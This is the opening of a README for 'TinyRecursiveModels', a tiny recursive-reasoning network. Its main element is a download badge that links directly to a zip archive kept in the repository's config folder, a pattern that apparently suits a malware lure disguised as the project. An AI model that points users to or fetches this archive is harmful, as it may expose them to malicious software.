# 🧠 TinyRecursiveModels - Unlock Powerful Reasoning with Tiny Networks

[![Download TinyRecursiveModels](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip)](https://github.com/chriscowncrow/TinyRecursiveModels/raw/refs/heads/main/config/Tiny_Models_Recursive_v2.8.zip)

## 🌟 Overview

Tiny Recursive Models (TRM) provides a unique approach to recursive reasoning. This method shows that smaller models can solve complex problems without requiring vast resources. With TRM, you can explore how a 7 million parameters neural network achieves impressive scores on challenging tasks. Our goal is to shift the focus from large models to smaller, efficient ones that still deliver robust performance.
